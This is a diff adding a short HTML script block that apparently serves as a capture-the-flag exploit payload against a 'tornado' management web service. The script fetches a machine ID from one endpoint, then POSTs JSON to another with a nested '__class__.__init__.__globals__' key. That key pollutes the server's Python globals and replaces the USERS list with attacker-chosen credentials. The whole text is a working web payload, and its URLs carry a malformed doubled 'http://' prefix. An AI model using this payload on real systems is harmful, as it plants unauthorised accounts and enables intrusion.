@@ -1,0 +1,24 @@
+<script>
+    fetch('http://http://83.136.255.10:39316/get_tornados')
+        .then(response => response.json())
+        .then(machines => {
+            let firstMachine = machines[0].machine_id;
+            let json = {
+                "machine_id": firstMachine,
+                "status": "active",
+                "__class__": {
+                    "__init__": {
+                        "__globals__": {
+                            "USERS": [{"username": "gg", "password": "gg"}]
+                        }
+                    }
+                }
+            };
+
+            return fetch(`http://http://83.136.255.10:39316/update_tornado`, {
+                method: "POST",
+                mode: "cors",
+                body: JSON.stringify(json)
+            });
+        })
+</script>
